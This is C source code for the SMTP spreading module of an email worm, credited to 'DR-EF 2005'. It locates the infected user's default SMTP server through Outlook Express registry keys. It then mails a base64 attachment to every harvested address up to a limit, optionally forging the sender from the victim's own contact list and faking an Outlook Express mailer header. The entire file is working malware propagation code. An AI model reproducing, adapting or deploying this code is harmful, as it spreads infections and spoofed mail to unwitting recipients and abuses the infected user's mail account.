

   #include "stdafx.h"
   #include "winsock2.h"
   #include "stdlib.h"
   #include "smtp_engine.h"

   //smtp engine module (c) DR-EF 2005


   BOOL SendMails(SOCKET msocket,maillist1 Mail_List,void *base64_image,int b64_size,MailInfoList MIL)
   {
       /*
           send mail to all addresses at maill list

           input:

               msocket - mail socket

               mail_list - mail list

               base64_image - pointer to base64 image of the attachment

               b64_size - size of the data at base64_image

               MIL - mail info list

           output:

               boolean - success/fail

       */


       char mime_header[]="From: <%s>\r\nSubject: %s\r\nMIME-Version: 1.0\r\nContent-Type: multipart/mixed;\r\n\tboundary=\"%s\"\r\nX-Priority: 3\r\nX-MSMail-Priority: Normal\r\nX-Mailer: Microsoft Outlook Express 6.00.2800.1106\r\nX-MimeOLE: Produced By Microsoft MimeOLE V6.00.2800.1106\r\n\r\nThis is a multi-part message in MIME format.\r\n--%s\r\nContent-Type: text/plain;\r\n\tcharset=\"windows-1255\"\r\nContent-Transfer-Encoding: 7bit\r\n\r\n%s\r\n--%s\r\nContent-Type: application/octet-stream;\r\n\tname= \"%s\"\r\nContent-Transfer-Encoding: base64\r\nContent-Disposition: attachment;\r\n\tfilename= \"%s\"\r\n\r\n";

       char buffer[4096],cmdbuf[90];

       char Hello[]="HELO <localhost>\r\n";

       char boundry[]="bound1";

       int retval,i=0,n_mil=0,n_mf=0;

       BOOL rcpt_ok=FALSE,ret_val=FALSE;

       srand(GetTickCount());

       retval=recv(msocket,buffer,sizeof(buffer),0);

       if(retval!=SOCKET_ERROR && retval!=0)
       {
           if(memcmp(buffer,"220",3)==0)       //connection ok ?
           {
               send(msocket,Hello,lstrlen(Hello),0); // send HELO command

               retval=recv(msocket,buffer,sizeof(buffer),0);

               if(retval!=SOCKET_ERROR && retval!=0)
               {
                   if(memcmp(buffer,"250",3)==0)       //HELO command ok ?
                   {
                       n_mil=(rand() % MIL.number_of_MIL); //pick random item from the MailInfoList

                       if(MIL.fake_mail_from==TRUE)
                       {
                           n_mf=(rand() % Mail_List.number_of_mails);
                           wsprintf(cmdbuf,"MAIL FROM:<%s>\r\n",Mail_List.mail_list[n_mf]);
                       }
                       else if(MIL.fake_mail_from==FALSE)
                       {
                           wsprintf(cmdbuf,"MAIL FROM:<%s>\r\n",MIL.mail_info_list[n_mil].mailfrom);
                       }

                       send(msocket,cmdbuf,lstrlen(cmdbuf),0); // send MAIL FROM command

                       retval=recv(msocket,buffer,sizeof(buffer),0);

                       if(retval!=SOCKET_ERROR && retval!=0)
                       {
                           if(memcmp(buffer,"250",3)==0)       //MAIL FROM command ok ?
                           {

                               if(Mail_List.max_mails_to_send<Mail_List.number_of_mails)
                                   Mail_List.number_of_mails=Mail_List.max_mails_to_send;

                               //start with the RCPT loop

                               for(i=0;i<Mail_List.number_of_mails;i++)
                               {
                                   wsprintf(cmdbuf,"RCPT TO:<%s>\r\n",Mail_List.mail_list[i]);
                                   send(msocket,cmdbuf,lstrlen(cmdbuf),0); // send RCPT command

                                   retval=recv(msocket,buffer,sizeof(buffer),0);

                                   if(retval!=SOCKET_ERROR && retval!=0)
                                   {
                                       if(memcmp(buffer,"25",2)==0)    //RCPT command ok ?
                                           rcpt_ok=TRUE;
                                       else
                                       {
                                           rcpt_ok=FALSE;
                                           break;
                                       }
                                   }
                                   else
                                   {
                                       rcpt_ok=FALSE;
                                       break;
                                   }
                               }

                               if(rcpt_ok==TRUE)   //all RCPT commands ok ?
                               {
                                   lstrcpy(cmdbuf,"DATA\r\n");
                                   send(msocket,cmdbuf,lstrlen(cmdbuf),0); // send DATA command

                                   retval=recv(msocket,buffer,sizeof(buffer),0);

                                   if(retval!=SOCKET_ERROR && retval!=0)
                                   {

                                       if(memcmp(buffer,"354",3)==0)   // is DATA command ok ?
                                       {


                                           //set MAIL FROM

                                           if(MIL.fake_mail_from==TRUE)
                                               lstrcpy(cmdbuf,Mail_List.mail_list[n_mf]);
                                           else
                                               lstrcpy(cmdbuf,MIL.mail_info_list[n_mil].mailfrom);

                                           //set mime header

                                           wsprintf(buffer,mime_header,
                                               cmdbuf, //set MAIL FROM
                                               MIL.mail_info_list[n_mil].subject,  //set subject
                                               boundry,    //set boundry
                                               boundry,    //set boundry
                                               MIL.mail_info_list[n_mil].text, //set mail text
                                               boundry,    //set boundry
                                               MIL.mail_info_list[n_mil].attachment,   //set attachment name
                                               MIL.mail_info_list[n_mil].attachment    //set attachment name
                                               );


                                           send(msocket,buffer,lstrlen(buffer),0);

                                           //send attachment

                                           send(msocket,(char *)base64_image,b64_size,0);

                                           //send boundry

                                           wsprintf(buffer,"\r\n--%s--\r\n",boundry);
                                           send(msocket,buffer,lstrlen(buffer),0);

                                           lstrcpy(buffer,"\r\n.\r\n");        //end of data
                                           send(msocket,buffer,lstrlen(buffer),0);

                                           recv(msocket,buffer,sizeof(buffer),0);

                                           if(memcmp(buffer,"250",3)==0)
                                               ret_val=TRUE;
                                       }
                                   }
                               }
                           }
                       }
                   }
               }
           }
           lstrcpy(buffer,"QUIT\r\n");
           send(msocket,buffer,lstrlen(buffer),0);     //send quit command
       }

       Sleep(2000);

       closesocket(msocket);
       return ret_val;
   }



   SOCKET FindSmtp_AndConnect()
   {
       /*
           find smtp server from the registry,and connect to it

           input: none

           if fail return NULL,if success return socket of the smtp connection

       */

       char    accountmanager[]="Software\\Microsoft\\Internet Account Manager";
       char    smtp_server[]="SMTP Server",dma[]="Default Mail Account";
       char    kbuffer[30],tbuffer[70],smtpserver[50];

       DWORD   v_size;

       HKEY    hkey,hkey2;

       BOOL    smtp_founded=FALSE;

       WSADATA wsd;

       SOCKET retsocket;

       LPHOSTENT hostnt;

       sockaddr_in sin;

       if(RegOpenKeyEx(HKEY_CURRENT_USER,accountmanager,0,KEY_READ,&hkey)==ERROR_SUCCESS)
       {
           v_size=sizeof(kbuffer);
           if(RegQueryValueEx(hkey,dma,0,NULL,(unsigned char *)kbuffer,&v_size)==ERROR_SUCCESS)
           {
               wsprintf(tbuffer,"Accounts\\%s",kbuffer);
               if(RegOpenKeyEx(hkey,tbuffer,0,KEY_READ,&hkey2)==ERROR_SUCCESS)
               {
                   v_size=sizeof(smtpserver);
                   if(RegQueryValueEx(hkey2,smtp_server,0,NULL,(unsigned char *)smtpserver,&v_size)==ERROR_SUCCESS)
                   {
                       smtp_founded=TRUE;
                   }
                   RegCloseKey(hkey2);
               }
           }
           RegCloseKey(hkey);
       }


       if(smtp_founded==FALSE)
           return NULL;

       if(WSAStartup(MAKEWORD(1,1),&wsd)==0)
       {
           retsocket=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);

           if(retsocket!=INVALID_SOCKET)
           {
               hostnt=gethostbyname(smtpserver);
               if(hostnt!=NULL)
               {
                   sin.sin_family=AF_INET;
                   sin.sin_port=htons(25); //smtp
                   sin.sin_addr=*((LPIN_ADDR)*hostnt->h_addr_list);
                   if(connect(retsocket,(LPSOCKADDR)&sin,sizeof(struct sockaddr))==0)
                       return retsocket;
               }
               closesocket(retsocket);
           }

           WSACleanup();
       }
       return NULL;
   }
